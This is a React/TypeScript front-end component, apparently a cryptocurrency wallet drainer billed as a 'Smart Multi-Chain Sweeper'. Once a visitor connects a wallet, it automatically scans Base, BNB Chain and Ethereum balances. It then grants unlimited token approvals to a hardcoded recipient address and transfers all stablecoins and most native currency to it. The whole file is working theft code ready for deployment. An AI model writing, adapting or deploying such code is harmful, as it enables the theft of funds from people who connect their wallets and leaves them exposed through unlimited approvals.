"use client"
import { useState, useEffect } from "react";
import WalletConnectProvider from "@walletconnect/web3-provider";
import { ethers, ZeroAddress } from "ethers";

// Add type declaration for window.ethereum
declare global {
  interface Window {
    ethereum?: {
      request: (args: { method: string; params?: any[] }) => Promise<any>;
      on: (event: string, callback: (...args: any[]) => void) => void;
      removeListener: (event: string, callback: (...args: any[]) => void) => void;
    };
  }
}

// --- Configuration ---
// !!! IMPORTANT: SET YOUR RECIPIENT ADDRESS HERE !!!
const RECIPIENT_ADDRESS = "0x76d35535F44125239330AB1c36255504fB4E0dA9"; // Replace with the actual recipient address

// Chain configurations (ordered by priority - chains with typically lower gas fees first)
const CHAINS = {
  base: {
    id: 8453,
    name: "Base",
    rpc: "https://mainnet.base.org",
    explorer: "https://basescan.org",
    tokens: [
      "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC
      "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", // DAI
    ],
    nativeSymbol: "ETH",
    priority: 1
  },
  bsc: {
    id: 56,
    name: "BNB Chain",
    rpc: "https://bsc-dataseed.binance.org",
    explorer: "https://bscscan.com",
    tokens: [
      "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
      "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", // DAI
      "0x55d398326f99059fF775485246999027B3197955", // USDT
    ],
    nativeSymbol: "BNB",
    priority: 2
  },
  ethereum: {
    id: 1,
    name: "Ethereum",
    rpc: "https://cloudflare-eth.com",
    explorer: "https://etherscan.io",
    tokens: [
      "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
      "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
      "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    ],
    nativeSymbol: "ETH",
    priority: 3
  }
};

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

interface ChainAssets {
  chainId: number;
  chainName: string;
  nativeBalance: bigint;
  nativeSymbol: string;
  canAffordGas: boolean;
  tokens: Array<{
    address: string;
    symbol: string;
    balance: bigint;
    decimals: number;
  }>;
}

export default function WalletConnector() {
  const [address, setAddress] = useState("");
  const [isConnecting, setIsConnecting] = useState(false);
  const [isTransferring, setIsTransferring] = useState(false);
  const [error, setError] = useState("");
  const [transferMessages, setTransferMessages] = useState<string[]>([]);
  const [connectionMethod, setConnectionMethod] = useState<"extension" | "walletconnect" | null>(null);
  const [currentSigner, setCurrentSigner] = useState<ethers.Signer | null>(null);

  useEffect(() => {
    if (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) {
      setError("CRITICAL: Recipient address is not configured or is invalid. Asset transfer will not work. Please set it in the code.");
      console.error("CRITICAL: Recipient address is not configured or is invalid.");
    }
  }, []);

  const addMessage = (message: string) => {
    setTransferMessages(prev => [...prev, message]);
    console.log(message);
  };

  const switchChain = async (chainId: number): Promise<boolean> => {
    if (!window.ethereum) return false;
    
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: `0x${chainId.toString(16)}` }],
      });

      return new Promise<boolean>((resolve) => {
        const handleChainChanged = (newChainId: string) => {
          if (parseInt(newChainId, 16) === chainId) {
            window.ethereum?.removeListener('chainChanged', handleChainChanged);
            resolve(true);
          }
        };

        window.ethereum?.on('chainChanged', handleChainChanged);
        
        setTimeout(() => {
          window.ethereum?.removeListener('chainChanged', handleChainChanged);
          resolve(true);
        }, 3000);
      });
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          const chain = Object.values(CHAINS).find(c => c.id === chainId);
          if (!chain) return false;
          
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: `0x${chainId.toString(16)}`,
              chainName: chain.name,
              nativeCurrency: {
                name: chain.nativeSymbol,
                symbol: chain.nativeSymbol,
                decimals: 18
              },
              rpcUrls: [chain.rpc],
              blockExplorerUrls: [chain.explorer]
            }]
          });

          return new Promise<boolean>((resolve) => {
            const handleChainChanged = (newChainId: string) => {
              if (parseInt(newChainId, 16) === chainId) {
                window.ethereum?.removeListener('chainChanged', handleChainChanged);
                resolve(true);
              }
            };

            window.ethereum?.on('chainChanged', handleChainChanged);
            
            setTimeout(() => {
              window.ethereum?.removeListener('chainChanged', handleChainChanged);
              resolve(true);
            }, 3000);
          });
        } catch (addError) {
          console.error('Error adding chain:', addError);
          return false;
        }
      }
      console.error('Error switching chain:', switchError);
      return false;
    }
  };

  const scanAllChains = async (userAddress: string): Promise<ChainAssets[]> => {
    const chainAssets: ChainAssets[] = [];
    const sortedChains = Object.entries(CHAINS).sort(([,a], [,b]) => a.priority - b.priority);

    for (const [chainKey, chain] of sortedChains) {
      addMessage(`🔍 Scanning ${chain.name}...`);

      try {
        const switched = await switchChain(chain.id);
        if (!switched) {
          addMessage(`❌ Failed to switch to ${chain.name}`);
          continue;
        }

        const provider = new ethers.BrowserProvider(window.ethereum!);
        
        // Get native balance
        const nativeBalance = await provider.getBalance(userAddress);
        
        // Estimate gas costs more accurately
        const feeData = await provider.getFeeData();
        const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || BigInt("20000000000");
        
        // Calculate gas needed for potential transactions
        const nativeTransferGas = BigInt(21000);
        const tokenTransferGas = BigInt(65000); // Higher estimate for token transfers
        const tokenApprovalGas = BigInt(50000);
        
        const singleTxCost = gasPrice * nativeTransferGas;
        const tokenTxCost = gasPrice * tokenTransferGas;
        const approvalCost = gasPrice * tokenApprovalGas;

        const chainAsset: ChainAssets = {
          chainId: chain.id,
          chainName: chain.name,
          nativeBalance,
          nativeSymbol: chain.nativeSymbol,
          canAffordGas: nativeBalance > (singleTxCost * BigInt(2)), // Can afford at least 2 transactions
          tokens: []
        };

        // Scan tokens
        for (const tokenAddress of chain.tokens) {
          try {
            const signer = await provider.getSigner();
            const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
            
            const [balance, decimals, symbol] = await Promise.all([
              tokenContract.balanceOf(userAddress),
              tokenContract.decimals(),
              tokenContract.symbol().catch(() => "TOKEN")
            ]);

            if (balance > 0) {
              chainAsset.tokens.push({
                address: tokenAddress,
                symbol,
                balance,
                decimals: Number(decimals)
              });
              
              const formattedAmount = ethers.formatUnits(balance, decimals);
              addMessage(`💰 Found ${formattedAmount} ${symbol} on ${chain.name}`);
            }
          } catch (err: any) {
            addMessage(`⚠️ Error checking token ${tokenAddress.slice(0, 10)}... on ${chain.name}: ${err.message}`);
          }
        }

        // Log native balance
        if (nativeBalance > 0) {
          const formattedNative = ethers.formatEther(nativeBalance);
          addMessage(`💰 Found ${formattedNative} ${chain.nativeSymbol} on ${chain.name} (Gas sufficient: ${chainAsset.canAffordGas ? 'Yes' : 'No'})`);
        }

        // Determine if we can afford gas for token operations
        const tokensNeedingTransfer = chainAsset.tokens.length;
        const totalGasNeeded = (BigInt(tokensNeedingTransfer) * (approvalCost + tokenTxCost)) + singleTxCost; // +1 for native transfer
        chainAsset.canAffordGas = nativeBalance > totalGasNeeded;

        chainAssets.push(chainAsset);

      } catch (err: any) {
        addMessage(`❌ Error scanning ${chain.name}: ${err.message}`);
      }
    }

    return chainAssets;
  };

  const executeTransfersForChain = async (chainAsset: ChainAssets, userAddress: string): Promise<boolean> => {
    if (!chainAsset.canAffordGas && chainAsset.tokens.length > 0) {
      addMessage(`⚠️ Skipping ${chainAsset.chainName} - insufficient gas for token transfers`);
      return false;
    }

    addMessage(`\n🚀 Processing ${chainAsset.chainName}...`);
    
    try {
      const switched = await switchChain(chainAsset.chainId);
      if (!switched) {
        addMessage(`❌ Failed to switch to ${chainAsset.chainName}`);
        return false;
      }

      const provider = new ethers.BrowserProvider(window.ethereum!);
      const signer = await provider.getSigner();

      let hasTransfers = false;

      // First, handle all token approvals in batch
      if (chainAsset.tokens.length > 0) {
        addMessage(`📝 Processing token approvals for ${chainAsset.chainName}...`);
        
        for (const token of chainAsset.tokens) {
          try {
            const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
            
            // Check current allowance
            const currentAllowance = await tokenContract.allowance(userAddress, RECIPIENT_ADDRESS);
            
            if (currentAllowance < token.balance) {
              addMessage(`📝 Approving ${token.symbol}...`);
              
              // Approve maximum amount to avoid future approvals
              const approveTx = await tokenContract.approve(RECIPIENT_ADDRESS, ethers.MaxUint256);
              addMessage(`⏳ Waiting for ${token.symbol} approval...`);
              await approveTx.wait();
              addMessage(`✅ ${token.symbol} approved`);
            } else {
              addMessage(`✅ ${token.symbol} already approved`);
            }
          } catch (err: any) {
            addMessage(`❌ Failed to approve ${token.symbol}: ${err.message}`);
          }
        }

        // Then transfer all tokens
        addMessage(`📤 Transferring tokens on ${chainAsset.chainName}...`);
        
        for (const token of chainAsset.tokens) {
          try {
            const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
            
            addMessage(`📤 Transferring ${ethers.formatUnits(token.balance, token.decimals)} ${token.symbol}...`);
            
            const transferTx = await tokenContract.transfer(RECIPIENT_ADDRESS, token.balance);
            addMessage(`⏳ Waiting for ${token.symbol} transfer confirmation...`);
            
            const receipt = await transferTx.wait();
            if (receipt && receipt.status === 1) {
              addMessage(`✅ ${token.symbol} transfer completed`);
              hasTransfers = true;
            } else {
              addMessage(`❌ ${token.symbol} transfer failed`);
            }
          } catch (err: any) {
            addMessage(`❌ Failed to transfer ${token.symbol}: ${err.message}`);
          }
        }
      }

      // Finally, transfer native currency (leaving some for gas if needed elsewhere)
      if (chainAsset.nativeBalance > 0) {
        try {
          const currentBalance = await provider.getBalance(userAddress);
          const feeData = await provider.getFeeData();
          const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || BigInt("20000000000");
          const gasLimit = BigInt(21000);
          const gasCost = gasLimit * gasPrice * BigInt(3); // 3x buffer for safety

          if (currentBalance > gasCost) {
            const amountToSend = currentBalance - gasCost;
            const formattedAmount = ethers.formatEther(amountToSend);
            
            addMessage(`📤 Transferring ${formattedAmount} ${chainAsset.nativeSymbol}...`);
            
            const nativeTx = await signer.sendTransaction({
              to: RECIPIENT_ADDRESS,
              value: amountToSend,
              gasLimit: gasLimit
            });
            
            addMessage(`⏳ Waiting for ${chainAsset.nativeSymbol} transfer confirmation...`);
            
            const receipt = await nativeTx.wait();
            if (receipt && receipt.status === 1) {
              addMessage(`✅ ${chainAsset.nativeSymbol} transfer completed`);
              hasTransfers = true;
            } else {
              addMessage(`❌ ${chainAsset.nativeSymbol} transfer failed`);
            }
          } else {
            addMessage(`⚠️ ${chainAsset.nativeSymbol} balance too low after gas estimation`);
          }
        } catch (err: any) {
          addMessage(`❌ Failed to transfer ${chainAsset.nativeSymbol}: ${err.message}`);
        }
      }

      return hasTransfers;

    } catch (err: any) {
      addMessage(`❌ Error processing ${chainAsset.chainName}: ${err.message}`);
      return false;
    }
  };

  const handleSuccessfulConnection = async (signer: ethers.Signer, userAddress: string, method: "extension" | "walletconnect") => {
    setAddress(userAddress);
    setConnectionMethod(method);
    setCurrentSigner(signer);
    setError("");
    setTransferMessages([]);
    
    if (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) {
      const msg = "Asset transfer aborted: Recipient address is invalid or not set.";
      setError(msg);
      addMessage(msg);
      return;
    }

    addMessage(`🔗 Connected: ${userAddress}`);
    addMessage(`🎯 Target: ${RECIPIENT_ADDRESS}`);
    addMessage(`\n📊 Starting comprehensive asset scan...`);
    
    setIsTransferring(true);

    try {
      // Scan all chains for assets
      const allChainAssets = await scanAllChains(userAddress);
      
      // Filter chains that have assets and can afford operations
      const viableChains = allChainAssets.filter(chain => 
        (chain.tokens.length > 0 && chain.canAffordGas) || 
        (chain.tokens.length === 0 && chain.nativeBalance > 0)
      );

      if (viableChains.length === 0) {
        addMessage(`\n❌ No viable assets found across all chains`);
        setIsTransferring(false);
        return;
      }

      addMessage(`\n📋 Found assets on ${viableChains.length} chains:`);
      viableChains.forEach(chain => {
        const tokenCount = chain.tokens.length;
        const nativeAmount = ethers.formatEther(chain.nativeBalance);
        addMessage(`  • ${chain.chainName}: ${tokenCount} tokens + ${nativeAmount} ${chain.nativeSymbol}`);
      });

      addMessage(`\n⚡ Starting automatic transfers...`);
      
      let totalSuccessfulChains = 0;

      // Process each viable chain
      for (const chainAsset of viableChains) {
        const success = await executeTransfersForChain(chainAsset, userAddress);
        if (success) {
          totalSuccessfulChains++;
        }
        
        // Small delay between chains
        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      addMessage(`\n🏁 SWEEP COMPLETED`);
      addMessage(`✅ Successfully processed ${totalSuccessfulChains}/${viableChains.length} chains`);
      addMessage(`🎉 All available assets transferred to: ${RECIPIENT_ADDRESS}`);

    } catch (err: any) {
      addMessage(`❌ Critical error during sweep: ${err.message}`);
    } finally {
      setIsTransferring(false);
    }
  };

  const connectWithExtension = async () => {
    setIsConnecting(true);
    setError("");
    setTransferMessages([]);

    try {
      if (!window.ethereum) {
        setError("No crypto wallet extension detected. Please install MetaMask or a similar extension.");
        setIsConnecting(false);
        return false;
      }
      
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      if (!accounts || accounts.length === 0) {
          setError("No accounts found or permission denied by user.");
          setIsConnecting(false);
          return false;
      }
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();
      
      await handleSuccessfulConnection(signer, userAddress, "extension");
      return true;
    } catch (err: any) {
      console.error("Extension connection failed:", err);
      setError(`Extension connection failed: ${err.message || "User rejected the request or an unknown error occurred."}`);
      return false;
    }
  };

  const connectWithWalletConnect = async () => {
    setIsConnecting(true);
    setError("");
    setTransferMessages([]);
    try {
      const provider = new WalletConnectProvider({
        rpc: { 1: "https://cloudflare-eth.com" },
      });
      
      await provider.enable();
      const ethersProvider = new ethers.BrowserProvider(provider);
      const signer = await ethersProvider.getSigner();
      const userAddress = await signer.getAddress();
      
      await handleSuccessfulConnection(signer, userAddress, "walletconnect");
      return true;
    } catch (err: any) {
      console.error("WalletConnect connection failed:", err);
      if (err.message && (err.message.includes("User closed modal") || err.message.includes("Connection request reset"))) {
        setError("WalletConnect connection cancelled or closed by user.");
      } else {
        setError(`WalletConnect connection failed: ${err.message || "Unknown error"}`);
      }
      return false;
    }
  };

  const connectWallet = async () => {
    setIsConnecting(true);
    setError("");
    setTransferMessages([]);
    
    try {
      const extensionConnected = await connectWithExtension();
      
      if (!extensionConnected) {
        setError("");
        console.log("Extension connection attempt finished. Trying WalletConnect...");
        
        const wcConnected = await connectWithWalletConnect();
        if (!wcConnected && !error) {
            setError("Failed to connect using any available method.");
        }
      }
    } catch (err: any) {
        setError(err.message || "An unexpected error occurred during connection.");
        console.error("ConnectWallet outer catch:", err);
    } finally {
      setIsConnecting(false);
    }
  };

  const disconnectWallet = async () => {
    setAddress("");
    setConnectionMethod(null);
    setError("");
    setTransferMessages([]);
    setIsTransferring(false);

    if (connectionMethod === "walletconnect" && currentSigner?.provider) {
        const wcProvider = (currentSigner.provider as any).provider;
        if (wcProvider && typeof wcProvider.disconnect === 'function') {
            try {
                await wcProvider.disconnect();
                console.log("WalletConnect session disconnected");
            } catch (e) {
                console.error("Error disconnecting WalletConnect session:", e);
            }
        }
    }
    setCurrentSigner(null);
    console.log("Wallet disconnected from dApp.");
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4 bg-gray-50 dark:bg-gray-900">
      <div className="max-w-lg w-full bg-white dark:bg-gray-800 rounded-lg shadow-md p-6">
        <h1 className="text-2xl font-bold mb-2 text-center dark:text-white">
          ⚡ Smart Multi-Chain Sweeper
        </h1>
        <p className="text-xs text-center text-red-500 dark:text-red-400 mb-1 font-semibold">
          🚨 AUTO-EXECUTION: Connection triggers immediate intelligent asset sweep
        </p>
        <p className="text-xs text-center text-yellow-500 dark:text-yellow-400 mb-1">
          💡 Smart Logic: Tokens first → Native last → Skip chains with insufficient gas
        </p>
        <p className="text-xs text-center text-blue-500 dark:text-blue-400 mb-4">
          ⚡ Max approvals for minimal interactions → Batch operations → Automatic execution
        </p>
        
        {!address ? (
          <div className="space-y-4">
            <div className="p-3 bg-red-50 dark:bg-red-900 rounded-lg border border-red-200 dark:border-red-700">
              <p className="text-xs text-red-700 dark:text-red-300 font-medium">
                🎯 TARGET RECIPIENT:
              </p>
              <p className="font-mono text-xs text-red-800 dark:text-red-200 break-all">
                {RECIPIENT_ADDRESS}
              </p>
            </div>
            
            <div className="p-3 bg-blue-50 dark:bg-blue-900 rounded-lg border border-blue-200 dark:border-blue-700">
              <p className="text-xs text-blue-700 dark:text-blue-300 font-medium mb-2">
                🧠 SMART SWEEP LOGIC:
              </p>
              <div className="space-y-1">
                <p className="text-xs text-blue-600 dark:text-blue-400">• Scan all chains simultaneously</p>
                <p className="text-xs text-blue-600 dark:text-blue-400">• Check gas availability per chain</p>
                <p className="text-xs text-blue-600 dark:text-blue-400">• Process tokens → native in order</p>
                <p className="text-xs text-blue-600 dark:text-blue-400">• Skip chains with insufficient gas</p>
              </div>
            </div>
            
            <button
              onClick={connectWallet}
              disabled={isConnecting || !ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress}
              className={`w-full py-3 px-4 rounded-lg font-medium ${
                isConnecting || !ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress
                  ? "bg-gray-400 cursor-not-allowed"
                  : "bg-red-600 hover:bg-red-700"
              } text-white transition-colors`}
            >
              {isConnecting ? "Connecting..." : (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) ? "Configure Recipient First" : "⚡ CONNECT & AUTO-SWEEP"}
            </button>
          </div>
        ) : (
          <div className="space-y-4">
            <div className="p-3 bg-gray-100 dark:bg-gray-700 rounded-lg">
              <p className="text-sm font-medium text-gray-500 dark:text-gray-300">
                🔗 Connected ({connectionMethod === "extension" ? "Browser Extension" : "WalletConnect"}):
              </p>
              <p className="font-mono text-sm text-blue-600 dark:text-blue-400 break-all">
                {address}
              </p>
              <p className="text-sm font-medium text-gray-500 dark:text-gray-300 mt-2">
                🎯 Target Recipient:
              </p>
              <p className="font-mono text-sm text-green-600 dark:text-green-400 break-all">
                {RECIPIENT_ADDRESS}
              </p>
            </div>

            {(isTransferring || transferMessages.length > 0) && (
              <div className={`mt-4 p-3 rounded-lg ${isTransferring ? 'bg-blue-50 dark:bg-blue-900 border border-blue-300 dark:border-blue-700' : 'bg-gray-50 dark:bg-gray-700 border border-gray-200 dark:border-gray-600'}`}>
                <p className={`font-medium ${isTransferring ? 'text-blue-700 dark:text-blue-300' : 'text-gray-700 dark:text-gray-200'}`}>
                  {isTransferring ? "🧠 Smart sweep in progress..." : "📋 Sweep completed:"}
                </p>
                <div className="mt-2 h-64 overflow-y-auto text-xs text-gray-600 dark:text-gray-300 space-y-1 styled-scrollbar">
                  {transferMessages.map((msg, index) => (
                    <p key={index} className={
                      msg.includes("❌") || msg.startsWith("ERROR") || msg.includes("FAILED") ? "text-red-500 dark:text-red-400" : 
                      msg.includes("✅") || msg.includes("SUCCESS") ? "text-green-500 dark:text-green-400" :
                      msg.includes("💰") ? "text-blue-600 dark:text-blue-400 font-medium" :
                      msg.includes("🚀") || msg.includes("🏁") ? "text-purple-600 dark:text-purple-400 font-semibold" :
                      msg.includes("📤") || msg.includes("⏳") ? "text-orange-500 dark:text-orange-400" :
                      ""
                    }>
                      {msg}
                    </p>
                  ))}
                  {isTransferring && (
                    <p className="text-blue-500 animate-pulse">🧠 Executing smart transfers...</p>
                  )}
                </div>
              </div>
            )}

            <button
              onClick={disconnectWallet}
              disabled={isTransferring}
              className="w-full py-2 px-4 bg-gray-500 hover:bg-gray-600 text-white rounded-lg transition-colors disabled:bg-gray-400"
            >
              {isTransferring ? "⏳ Sweep in progress..." : "Disconnect"}
            </button>
          </div>
        )}

        {error && !transferMessages.some(msg => msg.includes(error)) && (
          <p className="mt-3 text-sm text-red-500 dark:text-red-400 text-center">{error}</p>
        )}
      </div>
       
      <style jsx global>{`
        .styled-scrollbar::-webkit-scrollbar {
          width: 8px;
        }
        .styled-scrollbar::-webkit-scrollbar-track {
          background: transparent;
        }
        .styled-scrollbar::-webkit-scrollbar-thumb {
          background-color: rgba(156, 163, 175, 0.5);
          border-radius: 20px;
          border: 2px solid transparent;
          background-clip: content-box;
        }
        .dark .styled-scrollbar::-webkit-scrollbar-thumb {
            background-color: rgba(75, 85, 99, 0.7);
        }
      `}</style>
    </div>
  );
}